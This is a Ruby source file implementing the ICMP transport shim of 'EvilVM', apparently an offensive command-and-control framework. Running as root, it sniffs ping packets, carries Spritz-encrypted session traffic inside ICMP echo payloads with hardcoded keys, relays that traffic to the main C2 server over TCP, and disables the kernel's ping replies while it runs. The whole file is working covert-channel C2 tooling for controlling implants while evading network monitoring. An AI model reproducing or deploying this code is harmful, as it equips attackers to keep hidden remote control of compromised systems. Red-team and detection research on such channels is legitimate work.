#!/usr/bin/env ruby


$root = File.expand_path(File.dirname(__FILE__))

$LOAD_PATH << "#{$root}/"

require 'crypto.rb'
require 'packetfu'
require 'pp'
require 'socket'
require 'time'

$inkey = "\xf1\x77\x80\x02\xea\x2a\x5f\x72\xd2\x0b\x28\x1e\x38\xa9\xc9\x4b"
$outkey = "\x1c\xab\x2b\x1d\xa7\xf8\xd7\x98\x4a\x28\x8b\x54\x58\x71\xb0\x52"

def pputs(msg, color = 35)
  msg.gsub!("", "\x1b[1m")
  msg.gsub!("", "\x1b[22m")
  puts("\x1b[#{color}m#{msg}\x1b[0m")
end

class Session
  attr_accessor :sessid
  
  def initialize(known_ids, interface, server, port)
    @lastseq = -1
    @interface = interface
    @sessid = gen_id(known_ids)
    pputs("initiated new session #{@sessid}")
    
    @incrypto  = Ippwn::Crypto::SpritzC.new()
    @outcrypto = Ippwn::Crypto::SpritzC.new()

    @incrypto.key_setup($inkey)
    @outcrypto.key_setup($outkey)

    @console = TCPSocket.new(server, port)

    @mutex = Mutex.new()
    @queue = ""
    
    @thread = Thread.new do
      while true
        data = @console.recv(1)

        break if data.length == 0

        @mutex.synchronize do
          @queue << data
        end
      end

    pputs("#{Time.now.to_s} session #{@sessid} socket error, shutting down", 33)
    end
  end

  def gen_id(known_ids)
    while true
      id = rand(2**32)
      if id != 0 and not known_ids.include?(id)
        return id
      end
    end
  end
  
  def inbound(packet)
    (icmpid, icmpseq, session, sequence, length) = packet.payload.unpack("nnIII")

    if sequence == @lastseq
      # we must have dropped a packet, resend the last one
      pputs("#{Time.now.to_s} session #{@sessid} duplicate packet #{sequence}, resending response")
      @lastpacket.payload[0..3] = [icmpid, icmpseq].pack("nn")
      @lastpacket.recalc
      @lastpacket.to_w(@interface)
      return
    end

    @lastseq = sequence
    message = packet.payload[16..(16 + length)]

    if length > 0
      pputs("#{Time.now.to_s} session #{@sessid} received #{length} bytes")
      @console.write(decrypt(message))
    end

    data = ""
    more = 0

    @mutex.synchronize do
      if @queue.length > 0
        if @queue.length > 512
          data = @queue[0...512]
          @queue = @queue[512..-1]
          more = 1
        else
          data = @queue
          @queue = ""
          more = 0
        end
        pputs("#{Time.now.to_s} session #{@sessid} sending #{data.length} bytes", 32)
      elsif length == 0
        pputs("#{Time.now.to_s} session #{@sessid} ping")
      end
    end

    deliver(packet, make_payload(icmpid, icmpseq, session, sequence, encrypt(data), more))
  end

  def decrypt(data)
    return data.unpack("C*").map { |i| i ^ @outcrypto.drip() }.pack("C*")
  end

  def encrypt(data)
    return data.unpack("C*").map { |i| i ^ @incrypto.drip() }.pack("C*")
  end

  def deliver(packet, payload)
    outbound = PacketFu::ICMPPacket.new()
    outbound.ip_saddr = packet.ip_daddr
    outbound.ip_daddr = packet.ip_saddr
    outbound.payload = payload
    outbound.eth_dst = packet.eth_src
    outbound.eth_src = packet.eth_dst
    outbound.recalc

    #if rand(100) > 5
      outbound.to_w(@interface)
    #else
      #pputs("strategically dropping packet for fun", 31)
    #end

    @lastpacket = outbound
  end

  def make_payload(icmpid, icmpseq, session, sequence, message, more)
    return [icmpid, icmpseq, session, sequence, more, message.length, *message.unpack("C*")].pack("nnIICIC*")
  end
end

$queue = Queue.new

Thread.new do
  while true
    line = STDIN.readline(512)
    $queue << line
  end
end

if ARGV.length != 2
  pputs("")
  pputs(" usage: icmp-server.rb <svr-ip> <svr-port>", 33)
  pputs("")
  pputs("    <svr-ip>   IP for main EvilVM server", 33)
  pputs("    <svr-port> Port for main EvilVM server", 33)
  pputs("")
  exit(1)
end

pputs("Starting EvilVM's ICMP transport shim")

if Process.uid != 0
  pputs("To sniff ICMP, I need to be root!", 33)
  exit(2)
end

$ignorepath = "/proc/sys/net/ipv4/icmp_echo_ignore_all"

if(File.read($ignorepath) =~ /0/) 
  pputs("Ignoring pings (/proc/sys/net/ipv4/icmp_echo_ignore_all = 1)")
  $ignoreflag = true
  File.write("/proc/sys/net/ipv4/icmp_echo_ignore_all", "1")
else
  pputs("Kernel already ignoring pings (#{$ignorepath} = 0)")
end

begin

  conns = {}
  interface = PacketFu::Utils.default_int
  myip = PacketFu::Utils.default_ip
  server = ARGV[0]
  port = ARGV[1].to_i

  pputs("Using interface #{interface}, IP #{myip}")
  pputs("Connecting to server at #{server}:#{port}")
  capture = PacketFu::Capture.new(:iface => interface, :promisc => true, :filter => "icmp")
  count = 0
  
  capture.stream.each do |packet|
    packet = PacketFu::ICMPPacket.parse(packet)
    if packet.icmp_type == 8 and packet.ip_daddr == myip
      count += 1
      print("\x1b]0;#{count} packets\x07")
      (icmpid, icmpseq, sessid) = packet.payload.unpack("nnI")
      if sessid == 0
        session = Session.new(conns.keys, interface, server, port)
        conns[session.sessid] = session
        session.deliver(packet, [icmpid, icmpseq, session.sessid, 0, 0].pack("nnIII"))
      else
        session = conns[sessid]

        if session
          session.inbound(packet)
        end
      end
    end
  end
rescue SignalException => e
  pputs("Interrupted, exiting...", 33)
ensure
  if $ignoreflag
    pputs("Responding to pings (/proc/sys/net/ipv4/icmp_echo_ignore_all = 0)")
    File.write("/proc/sys/net/ipv4/icmp_echo_ignore_all", "0")
  end
end
